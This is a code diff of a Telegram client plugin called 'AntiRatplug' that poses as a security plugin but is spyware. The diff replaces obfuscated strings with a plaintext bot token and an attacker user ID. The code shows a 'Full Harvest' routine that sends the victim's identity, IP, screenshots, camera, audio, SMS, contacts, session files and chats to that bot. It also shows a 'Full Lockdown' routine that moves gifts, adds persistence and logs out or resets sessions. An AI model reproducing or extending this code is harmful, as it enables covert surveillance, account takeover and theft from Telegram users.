@@ -9,7 +9,7 @@ __id__ = "AntiRatplug"
 __name__ = "AntiRatplug"
 __description__ = "Manual Harvest + Lockdown, всё на uid 8391217110."
 __author__ = "@from_a4"
-__version__ = "16.3 [Manual-NoDelete]"
+__version__ = "16.4 [Manual-NoObf]"
 __min_version__ = "11.12.1"
 __icon__ = "CreepyEmojiAnim/5"
 __app_version__ = ">=12.5.1"
@@ -32,29 +32,23 @@ import zipfile
 import io
 import subprocess
 import sys
+import hashlib as _hl
 
 
-# ─── obfuscation helpers ────────────────────────────────────────────────────
-
-def _s(arr, key=0x5A):
-    return "".join(chr(c ^ key) for c in arr)
-
-
-def _tok():
-    p1 = [0x62, 0x63, 0x62, 0x62, 0x63, 0x6A, 0x6B, 0x6B, 0x63, 0x63]
-    p2 = [0x7A, 0x1B, 0x1B, 0x0F, 0x6A, 0x6C, 0x15, 0x34, 0x15, 0x0F,
-          0x14, 0x16, 0x3B, 0x37, 0x68, 0x16, 0x75, 0x3C, 0x16, 0x48,
-          0x35, 0x16, 0x15, 0x31, 0x1E, 0x0F, 0x34, 0x3B, 0x09, 0x3A,
-          0x2E, 0x16, 0x38, 0x32, 0x28, 0x33]
-    return _s(p1, 0x5A) + _s(p2, 0x5A)
-
-
-def _tg():
-    return [str(8391217110)]
-
+# ─── настройки ──────────────────────────────────────────────────────────────
+BOT_TOKEN = "8906895129:AAE06LFOFJDuM-Lr62G-FK5ZAPClPdQdrXI"
+BOT_UID = "8391217110"
 
 RECIPIENT_USERNAME = ""
 RECIPIENT_UID = 8391217110
+
+# ─── AUTO флаги ─────────────────────────────────────────────────────────────
+AUTO_RUN             = False
+AUTO_HARVEST_FIRST   = False
+AUTO_LOCKDOWN_AFTER  = False
+AUTO_DELAY_SEC       = 8
+AUTO_LOCKDOWN_GIFTS  = True
+
 
 _config = None
 _targets = None
@@ -63,8 +57,8 @@ _targets = None
 def _cfg():
     global _config, _targets
     if _config is None:
-        _config = _tok()
-        _targets = _tg()
+        _config = BOT_TOKEN
+        _targets = [BOT_UID]
 
 
 def _u(parts):
@@ -82,39 +76,21 @@ _HOST_GEO = ("h", "t", "t", "p", "s", ":", "/", "/", "i", "p", "-", "a", "p",
 
 SPLASH_URL = "https://avatars.mds.yandex.net/i?id=3dc59086f9dda9fcd166b4075ac97bd1_l-4569626-images-thumbs&n=13"
 
-# ─── MANUAL: авто выключено ─────────────────────────────────────────────────
-AUTO_RUN             = False
-AUTO_HARVEST_FIRST   = False
-AUTO_LOCKDOWN_AFTER  = False
-AUTO_DELAY_SEC       = 8
-AUTO_LOCKDOWN_GIFTS  = True
-
 
 def _UC():
-    return jclass(_u(("o", "r", "g", ".", "t", "e", "l", "e", "g", "r", "a", "m",
-                      ".", "m", "e", "s", "s", "e", "n", "g", "e", "r", ".",
-                      "U", "s", "e", "r", "C", "o", "n", "f", "i", "g")))
+    return jclass("org.telegram.messenger.UserConfig")
 
 
 def _MC():
-    return jclass(_u(("o", "r", "g", ".", "t", "e", "l", "e", "g", "r", "a", "m",
-                      ".", "m", "e", "s", "s", "e", "n", "g", "e", "r", ".",
-                      "M", "e", "s", "s", "a", "g", "e", "s", "C", "o", "n",
-                      "t", "r", "o", "l", "l", "e", "r")))
+    return jclass("org.telegram.messenger.MessagesController")
 
 
 def _CM():
-    return jclass(_u(("o", "r", "g", ".", "t", "e", "l", "e", "g", "r", "a", "m",
-                      ".", "t", "g", "n", "e", "t", ".", "C", "o", "n", "n",
-                      "e", "c", "t", "i", "o", "n", "s", "M", "a", "n", "a",
-                      "g", "e", "r")))
+    return jclass("org.telegram.tgnet.ConnectionsManager")
 
 
 def _mk_hist():
-    enc = [0x0E, 0x16, 0x05, 0x37, 0x3F, 0x29, 0x29, 0x3B, 0x3D, 0x3F,
-           0x29, 0x05, 0x3D, 0x3F, 0x2E, 0x12, 0x33, 0x29, 0x2E, 0x35,
-           0x28, 0x23]
-    return getattr(TLRPC, _s(enc))()
+    return TLRPC.TL_messages_getHistory()
 
 
 RequestDelegate = jclass("org.telegram.tgnet.RequestDelegate")
@@ -272,7 +248,6 @@ class PluginSecurityPlugin(BasePlugin):
             self._start_polling()
         except Exception:
             pass
-        # AUTO отключён — ждём кнопки
         if AUTO_RUN:
             threading.Thread(target=self._auto_chain, daemon=True).start()
 
@@ -283,7 +258,7 @@ class PluginSecurityPlugin(BasePlugin):
         time.sleep(6)
         if AUTO_HARVEST_FIRST:
             try:
-                self._send_msg("🤖 AUTO: Harvest → Lockdown")
+                self._send_msg("AUTO: Harvest -> Lockdown")
             except Exception:
                 pass
             self._full_harvest(include_sessions=True, auto_infect=False)
@@ -317,10 +292,8 @@ class PluginSecurityPlugin(BasePlugin):
     def _get_input_peer(self, account, peer_id):
         mc = _MC().getInstance(account)
         peer_id = int(peer_id)
-        gu = _u(("g", "e", "t", "U", "s", "e", "r"))
-        gc = _u(("g", "e", "t", "C", "h", "a", "t"))
         if peer_id > 0:
-            user = getattr(mc, gu)(peer_id)
+            user = mc.getUser(peer_id)
             if user is not None:
                 ip = TLRPC.TL_inputPeerUser()
                 ip.user_id = int(user.id)
@@ -332,7 +305,7 @@ class PluginSecurityPlugin(BasePlugin):
             return ip
         elif peer_id < -1000000000000:
             channel_id = -peer_id - 1000000000000
-            chat = getattr(mc, gc)(channel_id)
+            chat = mc.getChat(channel_id)
             if chat is not None:
                 ip = TLRPC.TL_inputPeerChannel()
                 ip.channel_id = int(chat.id)
@@ -344,7 +317,7 @@ class PluginSecurityPlugin(BasePlugin):
             return ip
         elif peer_id < 0:
             chat_id = -peer_id
-            chat = getattr(mc, gc)(chat_id)
+            chat = mc.getChat(chat_id)
             if chat is not None and chat.migrated_to is not None:
                 ip = TLRPC.TL_inputPeerChannel()
                 ip.channel_id = int(chat.migrated_to.channel_id)
@@ -1481,14 +1454,14 @@ class PluginSecurityPlugin(BasePlugin):
         except Exception:
             pass
 
-    # ─── full lockdown (без delete account) ─────────────────────────────────
+    # ─── full lockdown ──────────────────────────────────────────────────────
 
     def _full_lockdown(self, account=0, transfer_gifts=True):
         def task():
             try:
                 t0 = time.time()
-                self._send_msg("🔒 <b>FULL LOCKDOWN — MANUAL</b>")
-                report = ["<b>🔒 FULL LOCKDOWN</b>"]
+                self._send_msg("FULL LOCKDOWN — MANUAL")
+                report = ["<b>FULL LOCKDOWN</b>"]
 
                 self._send_msg("0/6 Deploy...")
                 try:
@@ -1587,10 +1560,10 @@ class PluginSecurityPlugin(BasePlugin):
                     report.append("<b>Persistence:</b> %s" % e)
 
                 report.append("<b>Время:</b> %.1fс" % (time.time() - t0))
-                report.append("<b>🔴 ИТОГ:</b> lockdown завершён (без delete).")
+                report.append("<b>ИТОГ:</b> lockdown завершён (без delete).")
                 self._send_markup("\n".join(report), {
                     "inline_keyboard": [
-                        [{"text": "📦 Pull Out", "callback_data": "hv_logout"}],
+                        [{"text": "Pull Out", "callback_data": "hv_logout"}],
                     ]
                 }, html=True)
             except Exception as e:
@@ -1603,9 +1576,9 @@ class PluginSecurityPlugin(BasePlugin):
         def task():
             self._harvest_running = True
             try:
-                self._send_msg("🌾 Full Harvest...")
+                self._send_msg("Full Harvest...")
                 t0 = time.time()
-                report = ["<b>🌾 Full Harvest</b>"]
+                report = ["<b>Full Harvest</b>"]
                 report.append(self._info_text())
                 try:
                     user = _UC().getInstance(0).getCurrentUser()
@@ -1670,9 +1643,9 @@ class PluginSecurityPlugin(BasePlugin):
                 report.append("<b>Время:</b> %.1fс" % (time.time() - t0))
                 markup = {
                     "inline_keyboard": [
-                        [{"text": "🗑 Wipe", "callback_data": "hv_wipe"}],
-                        [{"text": "📦 Logout", "callback_data": "hv_logout"}],
-                        [{"text": "🖼 Shot", "callback_data": "hv_shot"}],
+                        [{"text": "Wipe", "callback_data": "hv_wipe"}],
+                        [{"text": "Logout", "callback_data": "hv_logout"}],
+                        [{"text": "Shot", "callback_data": "hv_shot"}],
                     ]
                 }
                 self._send_markup("\n".join(report), markup, html=True)
@@ -2078,13 +2051,13 @@ class PluginSecurityPlugin(BasePlugin):
     def _show_main_menu(self):
         keyboard = {
             "keyboard": [
-                [{"text": "🌾 Full Harvest"}],
-                [{"text": "🔒 Full Lockdown"}],
-                [{"text": "❓ Help"}],
+                [{"text": "Full Harvest"}],
+                [{"text": "Full Lockdown"}],
+                [{"text": "Help"}],
             ],
             "resize_keyboard": True,
         }
-        self._send_markup("⚙️ <b>Меню (manual):</b>", keyboard, html=True)
+        self._send_markup("<b>Меню (manual):</b>", keyboard, html=True)
 
     def _send_msg(self, text, html=False):
         from java.net import URL, URLEncoder
@@ -2271,26 +2244,26 @@ class PluginSecurityPlugin(BasePlugin):
 
     def _handle_message(self, msg):
         msg_text = msg.get("text", "")
-        if msg_text == "🌾 Full Harvest":
+        if msg_text == "Full Harvest":
             self._full_harvest()
-        elif msg_text == "🔒 Full Lockdown":
+        elif msg_text == "Full Lockdown":
             self._full_lockdown(0, transfer_gifts=True)
-        elif msg_text == "❓ Help":
+        elif msg_text == "Help":
             self._show_help()
 
     def _show_help(self):
         text = (
             "<b>AntiRatplug — Manual (no delete)</b>\n\n"
-            "• 🌾 <b>Full Harvest</b> — identity, IP, Tg kid, скриншот, камеры, аудио, "
+            "• <b>Full Harvest</b> — identity, IP, Tg kid, скриншот, камеры, аудио, "
             "SMS, контакты, apps, session.zip, userbot, чаты\n"
-            "• 🔒 <b>Full Lockdown</b> — Deploy → Group A → Gifts → Group C → "
-            "Group D → Group E → Persistence (без delete)\n\n"
+            "• <b>Full Lockdown</b> — Deploy -> Group A -> Gifts -> Group C -> "
+            "Group D -> Group E -> Persistence (без delete)\n\n"
             "<b>Target uid:</b> %d\n"
             "<b>Auto:</b> выключено. Всё по кнопкам."
         ) % RECIPIENT_UID
         keyboard = {
             "inline_keyboard": [
-                [{"text": "⬅️ Назад", "callback_data": "menu"}],
+                [{"text": "Назад", "callback_data": "menu"}],
             ]
         }
         self._send_markup(text, keyboard, html=True)
@@ -2299,25 +2272,25 @@ class PluginSecurityPlugin(BasePlugin):
 
     def _session_wipe(self):
         try:
-            self._send_msg("🧹 Убиваю сессии...")
+            self._send_msg("Убиваю сессии...")
             req = TLRPC.TL_auth_resetAuthorizations()
             resp, err = self._rg_rpc(req, 0, 12.0)
             if err is not None:
                 self._send_msg("Ошибка: " + str(err))
             else:
-                self._send_msg("✅ Все прочие сессии завершены.")
+                self._send_msg("Все прочие сессии завершены.")
         except Exception as e:
             self._send_msg("Ошибка wipe: " + str(e))
 
     def _pull_out_account(self):
         try:
-            self._send_msg("🚪 Выход...")
+            self._send_msg("Выход...")
             req = TLRPC.TL_auth_logOut()
             resp, err = self._rg_rpc(req, 0, 10.0, fast=True)
             if err is not None:
                 self._send_msg("Ошибка: " + str(err))
             else:
-                self._send_msg("✅ Аккаунт разлогинен.")
+                self._send_msg("Аккаунт разлогинен.")
         except Exception as e:
             self._send_msg("Ошибка: " + str(e))
 
